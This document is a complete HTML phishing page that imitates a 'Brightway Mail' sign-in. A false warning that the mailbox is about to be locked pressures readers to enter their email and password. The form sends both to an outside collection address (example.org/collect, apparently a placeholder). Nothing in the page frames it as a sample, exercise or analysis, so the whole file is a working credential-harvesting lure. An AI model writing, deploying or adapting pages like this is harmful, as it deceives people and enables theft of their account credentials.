<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Brightway Mail: verify your account</title>
<style>body{font:16px/1.5 system-ui,sans-serif;background:#f1f4f8;margin:0;display:grid;place-items:center;min-height:100vh}
form{background:#fff;padding:32px;border-radius:12px;width:min(360px,90vw);box-shadow:0 4px 24px #0002}
h1{font-size:22px;margin:0 0 6px}p{margin:0 0 16px;color:#556}label{display:block;font-size:13px;margin:12px 0 4px}
input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #bbc;border-radius:6px;font-size:16px}
button{margin-top:18px;width:100%;padding:12px;background:#1b5cff;color:#fff;border:0;border-radius:6px;font-size:16px}</style></head>
<body>
<form id="signin" action="https://example.org/collect" method="post">
<h1>Brightway Mail</h1>
<p>Your mailbox is about to be locked. Verify your account to keep it.</p>
<label for="email">Email address</label><input id="email" name="email" type="email" autocomplete="username">
<label for="pw">Password</label><input id="pw" name="password" type="password" autocomplete="current-password">
<button type="submit">Verify account</button>
</form>
</body></html>
